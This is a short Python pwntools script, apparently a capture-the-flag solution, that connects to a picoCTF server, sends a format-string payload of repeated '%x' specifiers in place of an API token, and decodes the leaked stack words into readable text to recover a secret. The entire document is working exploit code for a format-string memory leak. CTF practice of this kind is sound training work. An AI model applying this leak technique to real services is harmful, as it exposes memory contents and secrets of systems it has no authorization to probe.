from pwn import *

# connect to remote host
remote = remote('mercury.picoctf.net', 59616)

# reach API input
remote.recvuntil("View my")
remote.send("1\n")
remote.recvuntil("What is your API token?\n")

# send format string vuln
remote.send("%x" + "-%x"*40 + "\n")

# receive response
remote.recvline()

# read in and clean response
response = remote.recvline()
response = response[:-1].decode()

# print response for debugging
print(response)

# define result variable
result = ""

# parse to characters
for i in response.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                result += chr(b)

# print string
print(result)
